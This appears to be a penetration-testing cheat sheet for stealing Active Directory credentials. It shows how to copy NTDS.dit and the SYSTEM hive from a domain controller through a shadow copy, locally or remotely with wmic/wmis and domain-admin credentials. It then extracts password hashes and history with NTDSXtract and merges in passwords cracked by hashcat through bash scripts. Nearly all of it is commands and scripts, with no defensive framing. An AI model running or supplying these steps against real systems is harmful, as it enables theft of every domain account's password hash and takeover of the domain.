Extract NTDS.dit and SYSTEM hive from Domain Controller
Create a volume shadow copy of the system drive on the domain controller. Launch a Command Prompt "As Administrator"

md c:\tmp
vssadmin create shadow /for=C:
vssadmin list shadows
copy \\?\GLOBALROOT\{device_id}\Windows\NTDS\NTDS.dit c:\tmp
copy \\?\GLOBALROOT\{device_id}\Windows\System32\config\SYSTEM c:\tmp\SYSTEM.hive
vssadmin delete shadows /for=C:
Remotely from Command Line
From Windows:

wmic /node:DC101 /user:DOMAIN\domainadmin /password:password123 process call create "cmd /c copy \\?\GLOBALROOT\Device\{device_id}\Windows\NTDS\NTDS.dit C:\tmp\NTDS.dit 2>&1 > C:\tmp\output.txt"
From Kali:

wmis -U DOMAIN\domainadmin%password123 //DC01 cmd.exe /c copy \\?\GLOBALROOT\Device\{device_id}\Windows\NTDS\NTDS.dit C:\tmp\NTDS.dit 2>&1 > C:\tmp\output.txt
Extract User Object Information from NTDS.dit
Download and Install libesedb:

wget https://googledrive.com/host/0B3fBvzttpiiSN082cmxsbHB0anc/libesedb-alpha-20120102.tar.gz --no-check-certificate 
tar zxvf libesedb-alpha-20120102.tar.gz
cd libesedb-20120102
./configure
make
make install
ldconfig
cp esedbtools/esedbexport /usr/bin
cp esedbtools/esedbinfo /usr/bin
ln -s /usr/bin/esedbexport /usr/bin esedbextract
Download and Install NTDSXtract:

yum -y install python-crypto
wget http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_2_beta.zip
unzip ntdsxtract_v1_2_beta.zip
mv NTDSXtract\ 1.0 ntdsxtract
Perform Extraction: (sometimes python2 is required to execute the command)

esedbexport ntds.dit
python ntdsxtract/dsusers.py ntds.dit.export/datatable.4 ntds.dit.export/link_table.6 --passwordhashes SYSTEM.hive --passwordhistory SYSTEM.hive >dsusers.out
Process Output to CSV
#!/bin/bash
#
echo "Record ID,User name,User principal name,SAM Account name,SAM Account type,GUID,SID,When created,When changed,Account expires,Password last set,Last logon,Last logon timestamp,Bas password time,Logon count,Bad password count,User Account Control,Password hashes,Cracked Password" > dsusers.csv
cat dsusers.out |grep "Record ID" |cut -d" " -f 13 >1
cat dsusers.out |grep "User name" |cut -d" " -f 13-20 >2
cat dsusers.out |grep "User principal name" |cut -d" " -f 4 >3
cat dsusers.out |grep "SAM Account name" |cut -d" " -f 7 >4
cat dsusers.out |grep "SAM Account type" |cut -d" " -f 7 >5
cat dsusers.out |grep "GUID" |cut -d" " -f 2 >6
cat dsusers.out |grep "SID" |cut -d" " -f 3 >7
cat dsusers.out |grep "When created" |cut -d" " -f 11-12 >8
cat dsusers.out |grep "When changed" |cut -d" " -f 11-12 >9
cat dsusers.out |grep "Account expires" |cut -d" " -f 8-10 >10
cat dsusers.out |grep "Password last set" |cut -d" " -f 7-8 >11
cat dsusers.out |grep "Last logon:" |cut -d" " -f 12 >12
cat dsusers.out |grep "Last logon timestamp" |cut -d" " -f 4-5 >13
cat dsusers.out |grep "Bad password time" |cut -d" " -f 8-9 >14
cat dsusers.out |grep "Logon count" |cut -d" " -f 12 >15
cat dsusers.out |grep "Bad password count" |cut -d" " -f 6 >16
cat dsusers.out |grep 'User Account Control\|Disabled' | awk '{S=!/^[[:space:]]/? S RS $0 : S OFS $1}END{print S}' OFS=\, |cut -d":" -f2 |cut -d"," -f2 |tail -n+2 > 17
cat dsusers.out |grep 'Password hashes\|\$NT\$' |grep -v "history" |tr " " "_" | awk '{S=!/^[[:space:]]/? S RS $0 : S OFS $1}END{print S}' OFS=\, |cut -d "," -f 2 |grep -v "Password_hashes:" > 18
paste -d "," 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 >> dsusers.csv
rm -fr 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18
Append Cracked Passwords from Hashcat
#!/bin/bash
#
cat dsusers.csv | while read line;
do
        hash=`echo $line |cut -d "," -f18 |cut -d "$" -f 3 |cut -d ":" -f1`
        chash=`cat cracked |cut -d":" -f1 | grep $hash`
        if [[ $hash == *"$chash"* ]]
        then
                user=`cat cracked |grep $hash |cut -d":" -f2`
                echo $line,$user
        else
                echo $line","
        fi
done
